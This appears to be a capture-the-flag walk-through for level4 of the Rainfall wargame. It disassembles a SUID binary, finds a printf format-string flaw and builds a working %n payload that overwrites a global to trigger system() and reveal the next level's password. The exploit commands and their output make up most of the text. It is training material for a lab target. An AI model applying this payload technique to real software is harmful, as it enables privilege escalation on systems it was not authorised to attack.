# Walk-through Level4

## Introduction
Level4 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.


## Security Checks
Examining the binary's security mechanisms reveals that it lacks several modern protections, making it more susceptible to exploitation:

```bash
level4@RainFall:~$ checksec --file level4 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level4
```
**Key observations:**
```
> **No RELRO** : The binary does not protect against GOT overwrite attacks.

> **No stack canary** : Buffer overflow attacks are possible.

> **NX disabled** : Stack is executable, allowing shellcode execution.

> **No PIE** : The binary has a fixed memory layout, making exploitation easier.
```
### Analyzing `level4`

After running the command `ls -l level4`, we observe the following output:

```
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```

From this output, we can see that the binary `level4` is set with **SUID (Set User ID)** and **SGID (Set Group ID)** permissions. This means:

- The `s` in the owner (`rws`) and group (`r-s`) permission bits indicates that the program will run with the privileges of its owner (`level5`) and group (`users`), regardless of who executes it.
- In other words, when any user runs this program, it will execute as if it were run by the `level5` user.


## Debugging
```
level4@RainFall:~$ ./level4
helloworld
helloworld
```
 

After running `./level4`, we found that it behaves similarly to the previous level. Let's debug it using GDB.  

```bash
gdb-peda$ disassemble main  
Dump of assembler code for function main:  
   0x080484a7 <+0>:	push   ebp  
   0x080484a8 <+1>:	mov    ebp,esp  
   0x080484aa <+3>:	and    esp,0xfffffff0  
   0x080484ad <+6>:	call   0x8048457 <n>  
   0x080484b2 <+11>:	leave    
   0x080484b3 <+12>:	ret    
End of assembler dump.
```
We can see that `main` directly calls the function `n`.  

```bash
gdb-peda$ disassemble n  
Dump of assembler code for function n:  
   0x08048457 <+0>:	push   ebp  
   0x08048458 <+1>:	mov    ebp,esp  
   0x0804845a <+3>:	sub    esp,0x218  
   0x08048460 <+9>:	mov    eax,ds:0x8049804  
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax  
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200  
   0x08048471 <+26>:	lea    eax,[ebp-0x208]  
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax  
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>  
   0x0804847f <+40>:	lea    eax,[ebp-0x208]  
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax  
   0x08048488 <+49>:	call   0x8048444 <p>  
   0x0804848d <+54>:	mov    eax,ds:0x8049810  
   0x08048492 <+59>:	cmp    eax,0x1025544  
   0x08048497 <+64>:	jne    0x80484a5 <n+78>  
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590  
   0x080484a0 <+73>:	call   0x8048360 <system@plt>  
   0x080484a5 <+78>:	leave    
   0x080484a6 <+79>:	ret    
End of assembler dump.  
```
Inside `n`, we notice a call to `p`.  

```bash
gdb-peda$ disassemble p  
Dump of assembler code for function p:  
   0x08048444 <+0>:	push   ebp  
   0x08048445 <+1>:	mov    ebp,esp  
   0x08048447 <+3>:	sub    esp,0x18  
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]  
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax  
   0x08048450 <+12>:	call   0x8048340 <printf@plt>  
   0x08048455 <+17>:	leave    
   0x08048456 <+18>:	ret    
End of assembler dump.  
```
We see that `p` calls `printf` at:  
```assembly
0x08048450 <+12>: call 0x8048340 <printf@plt>
```
Since `printf` is being used without format string protection, we check for a **format string vulnerability**.  

### Testing for Format String Vulnerability  
We run the following test:  
```bash
level4@RainFall:~$ python -c 'print(4 *"%x ")' | ./level4  
b7ff26b0 bffff794 b7fd0ff4 0  
```
The output confirms that we can leak stack addresses, meaning the program is **vulnerable to a format string attack**.  

### Finding the Exploit  
Looking at this section of `n`:  
```assembly
   0x0804848d <+54>:	mov    eax,ds:0x8049810  // 0x8049810 holds the value before the check  
   0x08048492 <+59>:	cmp    eax,0x1025544  // Compare eax with 0x1025544 (decimal 16930116)  
   0x08048497 <+64>:	jne    0x80484a5 <n+78>  // If not equal, jump  
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590  
   0x080484a0 <+73>:	call   0x8048360 <system@plt>  
```
We see that if we **overwrite** the value at `0x8049810` with `0x1025544`, the program will execute `system()` with address `0x8048590`.  

than, we need to craft an exploit to overwrite this value using the format string vulnerability.  

let's determine the position of the address `0x8049810` when injected: 
```
python -c 'print("\x10\x98\x04\x08" +  20 *"%x ")' | ./level4 
b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 8049810 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
```
From the output, we can see that our address appears at **position 12**.  

### Crafting the Exploit  
Now, let's find a way to overwrite our address. An easy method is to use padding with `printf`.

#### Payload Calculation:
- We need the address value to equal **16930116**.
- Since the address itself contributes **4 bytes**, the required padding is:  
  - `padding = 16930116 - 4 = 16930112`

#### Constructing the Payload:
```payload
python -c 'print("\x10\x98\x04\x08%16930112x%12$n ")' | ./level4
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    b7ff26b0 
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
